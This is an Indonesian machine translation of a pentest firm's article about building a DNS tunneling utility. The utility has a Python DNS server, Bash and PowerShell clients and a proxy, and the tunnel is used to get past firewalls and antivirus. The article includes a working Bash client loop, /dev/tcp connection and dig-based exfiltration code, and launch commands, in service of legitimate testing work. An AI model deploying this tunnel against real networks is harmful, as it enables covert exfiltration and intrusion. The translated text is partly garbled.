<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩‍🚒 🐢 🉑 Lalu lintas di ujung terowongan atau DNS di pentest ♑️ 🔇 🤫</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hai Dalam proyek pengujian penetrasi, kami sering menemukan jaringan segmen keras yang hampir sepenuhnya terisolasi dari dunia luar. Terkadang, untuk ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Lalu lintas di ujung terowongan atau DNS di pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Hai  Dalam proyek pengujian penetrasi, kami sering menemukan jaringan segmen keras yang hampir sepenuhnya terisolasi dari dunia luar.  Terkadang, untuk mengatasi masalah ini, perlu untuk meneruskan lalu lintas melalui satu-satunya protokol yang tersedia - DNS.  Dalam artikel ini, kami akan memberi tahu Anda cara mengatasi masalah serupa di 2018 dan kesulitan apa yang dihadapi dalam proses tersebut.  Utilitas populer juga akan ditinjau dan perilisan utilitas open-source mereka sendiri dengan fitur-fitur yang biasanya sangat kurang dalam alat serupa yang ada akan disajikan. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  Apa itu terowongan DNS </h1><br><p>  Sudah ada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">beberapa</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">artikel</a> tentang Habré yang menjelaskan apa itu tunneling DNS.  Namun, sedikit teori tentang tunneling DNS dapat ditemukan di bawah spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">Apa itu tunneling DNS?</b> <div class="spoiler_text"><p>  Kebetulan akses ke jaringan terputus oleh firewall, dan Anda perlu mentransfer data dengan sangat buruk, dan kemudian teknik tunneling DNS datang untuk menyelamatkan. </p><br><p>  Dalam diagram, semuanya terlihat seperti ini: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Permintaan untuk DNS, bahkan dengan pengaturan firewall yang paling ketat, terkadang masih berlalu, dan Anda dapat menggunakan ini dengan menjawabnya dari server Anda yang terletak di sisi lain.  Komunikasi akan sangat lambat, tetapi ini cukup untuk menembus jaringan lokal organisasi atau, misalnya, untuk segera mengakses Internet melalui Wi-Fi berbayar di luar negeri. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  Apa yang populer saat ini </h1><br><p>  Sekarang di Internet Anda dapat menemukan banyak utilitas untuk mengoperasikan teknik ini - masing-masing dengan fitur dan bug sendiri.  Kami memilih lima yang paling populer untuk pengujian komparatif: </p><br><ul><li>  dnscat2 </li><li>  yodium </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Anda dapat membaca lebih lanjut tentang bagaimana kami mengujinya di artikel kami di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Hacker</a> .  Di sini kami hanya memberikan hasilnya. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Seperti yang Anda lihat dari hasil, Anda bisa bekerja, tetapi dari sudut pandang pengujian penetrasi, ada beberapa kelemahan: </p><br><ul><li>  klien yang dikompilasi - pada mesin dengan antivirus, lebih mudah menjalankan sesuatu yang ditafsirkan daripada file biner; </li><li>  pekerjaan tidak stabil di bawah Windows; </li><li>  kebutuhan untuk menginstal perangkat lunak tambahan dalam beberapa kasus. </li></ul><br><p>  Karena kekurangan ini, kami perlu mengembangkan alat kami sendiri, dan inilah hasilnya ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Buat utilitas tunneling DNS Anda sendiri </h1><br><h2 id="predystoriya">  Latar belakang </h2><br><p>  Semuanya berawal pada pentest internal satu bank.  Di lobi ada komputer umum yang digunakan untuk mencetak dokumen, sertifikat, dan surat-surat lainnya.  Tujuan kami: untuk mendapatkan manfaat maksimal dari mesin yang menjalankan Windows 7, memiliki Kaspersky Anti-Virus di dalamnya dan memungkinkan akses ke hanya halaman tertentu (tetapi pada saat yang sama dimungkinkan untuk menyelesaikan nama DNS). </p><br><p>  Setelah melakukan analisis awal dan mendapatkan data tambahan dari mobil, kami mengembangkan beberapa vektor serangan.  Jalur dengan pengoperasian mesin menggunakan program biner segera dihapus ke samping, karena "Kaspersky" yang "hebat dan mengerikan" segera mendeteksi penghapusannya ketika mendeteksi file yang dapat dieksekusi.  Namun, kami berhasil mendapatkan kesempatan untuk menjalankan skrip atas nama administrator lokal, setelah salah satu ide itu hanya kemungkinan membuat terowongan DNS. </p><br><p>  Mencari metode yang mungkin, kami menemukan klien di PowerShell untuk dnscat2 (kami menulis tentang itu sebelumnya).  Tetapi pada akhirnya, maksimum yang dapat kami hasilkan adalah membuat koneksi untuk waktu yang singkat, setelah itu klien macet. </p><br><p>  Ini, untuk membuatnya lebih sederhana, sangat mengecewakan kami, karena dalam situasi ini kehadiran klien yang ditafsirkan hanya perlu.  Sebenarnya, ini adalah salah satu alasan untuk mengembangkan alat kami sendiri untuk penerowongan DNS. </p><br><h2 id="trebovaniya">  Persyaratan </h2><br><p>  Persyaratan utama kami untuk diri sendiri adalah: </p><br><ul><li>  kehadiran universal (sejauh mungkin) dan menafsirkan klien untuk sistem Unix dan Windows.  Untuk klien, masing-masing bash dan Powershell dipilih.  Di masa depan, klien Perl untuk unix direncanakan; </li><li>  kemampuan untuk meneruskan lalu lintas dari aplikasi tertentu; </li><li>  Dukungan untuk banyak klien untuk satu pengguna. </li></ul><br><h2 id="arhitektura-proekta">  Arsitektur proyek </h2><br><p>  Berdasarkan persyaratan, kami memulai pengembangan.  Dalam pandangan kami, utilitas terdiri dari 3 bagian: klien pada mesin internal, server DNS dan proxy kecil antara aplikasi pentester dan server DNS. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Untuk mulai dengan, kami memutuskan untuk meneruskan terowongan melalui catatan TXT. </p><br><p>  Prinsip operasi cukup sederhana: </p><br><ul><li>  Pentester meluncurkan server DNS. </li><li>  Sebuah pentester (atau pengguna, melalui rekayasa sosial) meluncurkan klien pada mesin internal.  Di klien ada parameter seperti nama klien dan domain, dan ada juga kemungkinan secara langsung menentukan alamat IP dari server DNS. </li><li> Pentester (dari jaringan eksternal) memulai proxy, di mana ia menunjukkan alamat IP dari server DNS, serta port tempat mengetuk, target IP (misalnya, ssh di jaringan internal di mana klien duduk) dan, karenanya, port target.  ID klien juga diperlukan, yang dapat diperoleh dengan menambahkan kunci <code>--clients</code> . </li><li>  Pentester meluncurkan aplikasi yang menarik baginya, menunjuk port proxy ke localhost. </li></ul><br><h2 id="protokol-obscheniya">  Protokol komunikasi </h2><br><p>  Pertimbangkan protokol yang cukup sederhana untuk komunikasi antara server dan klien. </p><br><h3 id="registraciya">  Pendaftaran </h3><br><p>  Ketika klien mulai, ia mendaftar ke server, meminta catatan TXT melalui subdomain dengan format berikut: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - kunci pendaftaran <br>  <code>&lt;7 random chars&gt;</code> - untuk menghindari caching data DNS <br>  <code>&lt;client name&gt;</code> - nama yang diberikan kepada klien saat startup <br>  <code>&lt;your domain&gt;</code> - mis.: xakep.ru <br>  Dalam hal pendaftaran berhasil, klien menerima pesan sukses dalam respons TXT, serta id yang diberikan kepadanya, yang akan terus ia gunakan. </p><br><h3 id="osnovnoy-cikl">  Siklus utama </h3><br><p>  Setelah registrasi, klien mulai menanyakan server tentang ketersediaan data baru dalam format </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  Jika ada data baru, dalam respons TXT ia menerimanya dalam format </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , jika tidak, <code>&lt;id&gt;ND</code> datang. </p><br><h3 id="cikl-zagruzki-dannyh">  Siklus pemuatan data </h3><br><p>  Klien dalam satu lingkaran memeriksa untuk melihat apakah data berasal dari <code>&lt;target&gt;</code> .  Jika ada jawaban, kita membaca, dari apa yang datang, buffer ukuran N Kb, memecahnya menjadi blok dengan panjang <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> dan mengirim data blok demi blok dalam format: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Jika transfer blok berhasil, kami mendapatkan OK dengan beberapa data tentang blok yang ditransfer, dalam hal penyelesaian transfer buffer, kami mendapatkan <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  Server DNS </h2><br><p>  Server DNS untuk tunneling ditulis dalam Python3 menggunakan pustaka dnslib, yang membuatnya mudah untuk membuat resolver DNS Anda sendiri dengan mewarisi dari objek dnslib.ProxyResolver dan menimpa metode resol (). </p><br><p>  Dnslib yang hebat memungkinkan Anda untuk membuat proxyDNS Anda sendiri dengan sangat cepat: </p><br><div class="spoiler">  <b class="spoiler_title">Sedikit kode server</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  Dalam mengatasi (), kami menentukan respons terhadap permintaan DNS dari klien: pendaftaran, meminta catatan baru, data pos balik, dan menghapus pengguna. </p><br><p>  Kami menyimpan informasi tentang pengguna dalam database SQLite, clipboard data terletak di RAM dan memiliki struktur berikut, di mana kuncinya adalah nomor klien: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP “” -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  “” <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Untuk memasukkan data dari pentester ke buffer, kami menulis “penerima” kecil, yang diluncurkan dalam aliran terpisah.  Ini menangkap koneksi dari pentester dan melakukan routing: ke mana klien mengirim permintaan. </p><br><p>  Sebelum memulai server, pengguna hanya perlu menetapkan satu parameter: DOMAIN_NAME - nama domain yang digunakan server. </p><br><h2 id="klient-na-bash">  Klien Bash </h2><br><p>  Bash dipilih untuk menulis klien untuk sistem Unix, karena paling sering ditemukan di sistem Unix modern.  Bash menyediakan kemampuan untuk terhubung melalui / dev / tcp /, bahkan dengan hak pengguna yang tidak terjangkau. </p><br><p>  Kami tidak akan menganalisis setiap bagian kode secara terperinci, lihat hanya pada poin yang paling menarik. <br>  Prinsip klien itu sederhana.  Untuk berkomunikasi dengan DNS, utilitas <code>dig</code> standar digunakan.  Klien mendaftar dengan server, setelah itu, dalam siklus abadi, ia mulai memenuhi permintaan menggunakan protokol yang dijelaskan sebelumnya.  Di bawah spoiler lebih banyak. </p><br><div class="spoiler">  <b class="spoiler_title">Baca lebih lanjut tentang klien Bash</b> <div class="spoiler_text"><p>  Pemeriksaan sedang dilakukan untuk menentukan apakah koneksi telah dibuat, dan jika demikian, fungsi balasan dilakukan (membaca data yang diterima dari target, membelah dan mengirim ke server). </p><br><p>  Setelah itu, diperiksa apakah ada data baru dari server.  Jika mereka ditemukan, maka kami memeriksa apakah koneksi harus dijatuhkan.  Kesenjangan itu sendiri terjadi ketika kami menerima informasi tentang target dengan ip 0.0.0.0 dan port 00. Dalam hal ini, kami menghapus file descriptor (jika tidak terbuka, tidak akan ada masalah) dan mengubah target ip ke 0.0.0.0 yang masuk. </p><br><p>  Lebih jauh di sepanjang kode kita melihat apakah ada kebutuhan untuk membuat koneksi baru.  Segera setelah pesan berikut mulai mengirimkan data kepada kami target, kami, jika ip sebelumnya tidak cocok dengan yang sekarang (akan jadi setelah reset), ubah target ke yang baru, dan buat koneksi melalui perintah <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , di mana <code>$ip</code> adalah target, <code>$port</code> adalah port target. <br>  Akibatnya, jika koneksi sudah dibuat, maka bagian data yang masuk diterjemahkan dan terbang ke deskriptor melalui perintah <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , di mana <code>${data_array[2]}</code> adalah apa yang kita dapatkan dari server. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Sekarang pertimbangkan mengirim fungsi balasan.  Pertama, kita membaca 2048 byte dari deskriptor dan segera menyandikannya melalui <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Kemudian, jika jawabannya kosong, kita keluar dari fungsi, jika tidak kita mulai operasi pemisahan dan pengiriman.  Perhatikan bahwa setelah pembentukan permintaan pengiriman melalui penggalian, pengiriman diperiksa untuk keberhasilan.  Jika berhasil, keluar dari siklus, jika tidak coba sampai berhasil. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Klien Powershell: </h2><br><p>  Karena kami membutuhkan interpretabilitas penuh dan bekerja pada kebanyakan sistem saat ini, klien dasar untuk Windows adalah utilitas nslookup standar untuk berkomunikasi melalui DNS dan objek System.Net.Sockets.TcpClient untuk membuat koneksi pada jaringan internal. </p><br><p>  Semuanya juga sangat sederhana.  Setiap iterasi dari loop adalah panggilan ke perintah nslookup menggunakan protokol yang dijelaskan sebelumnya. </p><br><p>  Misalnya, untuk mendaftar, jalankan perintah: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Jika kesalahan terjadi, maka kami tidak menunjukkannya, mengirimkan nilai deskriptor kesalahan ke $ null. </p><br><p>  nslookup mengembalikan jawaban yang mirip kepada kami: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Setelah itu kita perlu merentangkan semua garis dalam tanda kutip, untuk mana kita melewati mereka dengan musim reguler: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Sekarang Anda dapat memproses perintah yang diterima. <br>  Setiap kali alamat IP "korban" berubah, klien TCP dibuat, koneksi dibuat dan transfer data dimulai.  Dari server DNS, informasinya didekodekan base64, dan byte dikirim ke korban.  Jika "korban" menjawab sesuatu, maka kami menyandikan, membagi menjadi beberapa bagian dan menjalankan permintaan nslookup sesuai dengan protokol.  Itu saja. <br>  Ketika Anda menekan Ctrl + C, permintaan untuk menghapus klien dieksekusi. </p><br><h2 id="proxy">  Proksi: </h2><br><p>  Proxy untuk pentester adalah server proxy kecil di python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  Dalam parameter yang Anda butuhkan untuk menentukan IP dari server DNS, port tempat untuk terhubung ke server, opsi - klien mengembalikan daftar klien terdaftar, <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id dari klien dengan siapa kami akan berfungsi (terlihat setelah eksekusi - <code>--clients</code> ), - <code>--send_timeout</code> - timeout untuk mengirim pesan dari aplikasi. </p><br><p>  Ketika diluncurkan dengan parameter <code>--clients</code> , proksi mengirimkan permintaan ke server dalam format <code>\x00GETCLIENTS\n</code> . <br>  Dalam kasus ketika kami mulai bekerja, saat menghubungkan, kami mengirim pesan dalam format <code>\x02RESET:client_id\n</code> untuk mengatur ulang koneksi sebelumnya.  Setelah kami mengirim informasi tentang target kami: <code>\x01client_id:ip:port:\n</code> <br>  Lebih lanjut, ketika mengirim pesan ke klien, kami mengirim byte dalam format <code>\x03data</code> , dan kami hanya mengirim byte mentah ke aplikasi. <br>  Juga, proksi mendukung mode SOCKS5. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  Kesulitan apa yang mungkin timbul? </h2><br><p>  Seperti halnya mekanisme apa pun, utilitas mungkin gagal.  Jangan lupa bahwa terowongan DNS adalah hal yang tipis, dan banyak faktor yang dapat memengaruhi operasinya, mulai dari arsitektur jaringan hingga kualitas koneksi ke server produksi Anda. </p><br><p>  Selama pengujian, kami sesekali melihat gangguan kecil.  Misalnya, pada kecepatan cetak tinggi, bekerja melalui ssh, ada baiknya mengatur parameter <code>--send_timeout</code> , karena jika tidak, klien mulai membeku.  Juga, kadang-kadang koneksi mungkin tidak dibuat pertama kali, tetapi dapat dengan mudah dirawat dengan me-restart proxy, karena koneksi akan diatur ulang selama koneksi baru.  Ada juga masalah dengan resolusi domain saat bekerja dengan proxychains, tetapi ini juga dapat diperbaiki jika Anda menentukan parameter tambahan untuk proxychains.  Perlu dicatat bahwa saat ini utilitas tidak mengontrol tampilan permintaan yang tidak perlu dari caching server DNS, sehingga koneksi kadang-kadang gagal, namun, ini sekali lagi diperlakukan menggunakan metode yang dijelaskan di atas. </p><br><h2 id="zapusk">  Luncurkan </h2><br><p>  Konfigurasikan catatan NS di domain: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Kami menunggu hingga cache diperbarui (biasanya hingga 5 jam). </p><br><p>  Kami memulai server: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Luncurkan klien (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Kami memulai klien (Menang): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Mari kita lihat daftar klien yang terhubung: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Luncurkan proksi: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Pengujian: </p><br><p>  Setelah server dan setidaknya satu klien telah dimulai, kita dapat mengakses proxy seolah-olah itu adalah mesin jarak jauh kita. <br>  Mari kita coba untuk mensimulasikan situasi berikut: pentester ingin mengunduh file dari server dari jaringan lokal organisasi yang dilindungi oleh firewall, sambil menggunakan metode rekayasa sosial, ia dapat memaksa klien DNS untuk berjalan di dalam jaringan dan mencari tahu kata sandi server SSH. </p><br><p>  Pentester pada mesinnya memulai proxy, menunjukkan klien yang diperlukan dan kemudian dapat melakukan panggilan serupa yang akan dikirim ke klien, dan dari klien ke jaringan lokal. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Mari kita lihat apa yang terjadi: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  Di kiri atas, Anda dapat melihat kueri DNS yang datang ke server, lalu lintas proxy di kanan atas, lalu lintas klien di kiri bawah, dan aplikasi kami di kanan bawah.  Kecepatan ternyata cukup baik untuk terowongan DNS: 4.9Kb / s menggunakan kompresi. </p><br><p>  Ketika diluncurkan tanpa kompresi, utilitas menunjukkan kecepatan 1,8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Mari kita teliti lalu lintas server DNS, untuk ini kita menggunakan utilitas tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Kami melihat bahwa semuanya sesuai dengan protokol yang dijelaskan: klien terus-menerus memeriksa server apakah memiliki data baru untuk klien ini menggunakan kueri seperti <code>1c6Zx9Vi39.oversec.ru</code> .  Jika ada data, maka server merespons dengan satu set catatan TXT, jika tidak% client_num% ND ( <code>39ND</code> ).  client mengirimkan informasi ke server menggunakan jenis query <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  Dalam video-video berikut, Anda dapat dengan jelas melihat bagaimana utilitas bekerja bersama dengan meterpreter dan dalam mode SOCKS5. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  Hasilnya: </h2><br><p>  Mari kita rangkum sedikit.  Fitur apa yang dimiliki pengembangan ini dan mengapa kami menyarankan untuk menggunakannya? </p><br><ol><li>  Klien yang ditafsirkan di Bash dan Powershell: tidak ada EXE-shnikov dan ELF-s yang bisa sulit dijalankan. </li><li>  Stabilitas koneksi: dalam pengujian, utilitas kami berperilaku jauh lebih stabil, dan jika ada bug, Anda bisa menghubungkan kembali, sementara klien tidak mogok, seperti halnya dengan dnscat2, misalnya. </li><li>  Kecepatan cukup tinggi untuk terowongan DNS: tentu saja, kecepatannya tidak mencapai yodium, tetapi ada solusi kompilasi tingkat jauh lebih rendah. </li><li>  Tidak ada hak administrator yang diperlukan: klien Bash bekerja tanpa hak administrator, dan skrip Powershell kadang-kadang dilarang oleh kebijakan keamanan, tetapi ini cukup sederhana. </li><li>  Ada mode proxy socks5, yang memungkinkan Anda melakukannya <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> atau menjalankan nmap di seluruh jaringan internal. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Kode utilitas tersedia di sini.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id432078/">https://habr.com/ru/post/id432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id432068/index.html">Cara memfasilitasi studi Bahasa Inggris: 5 layanan bermanfaat</a></li>
<li><a href="../id432070/index.html">Secara singkat tentang saluran redux-saga</a></li>
<li><a href="../id432072/index.html">Tiga jenis kebocoran memori</a></li>
<li><a href="../id432074/index.html">Bagaimana pemain merobek kain realitas Spelunky dengan senapan</a></li>
<li><a href="../id432076/index.html">Fungsi yang tidak dikenali memperlambat program 5 kali</a></li>
<li><a href="../id432080/index.html">Pemain salah paham saat menilai risiko. Kontrol generator angka acak dalam pengembangan</a></li>
<li><a href="../id432082/index.html">Microsoft AI Chatbot Meluncurkan Koleksi Pakaian Cina</a></li>
<li><a href="../id432084/index.html">Bagaimana kami mengatur kompetisi shift antara pekerja produksi (seperti dalam USSR)</a></li>
<li><a href="../id432086/index.html">Pencetakan 3D di sekolah internasional dinamai M.V. Lomonosov</a></li>
<li><a href="../id432088/index.html">Ketersediaan Tinggi MySQL di GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
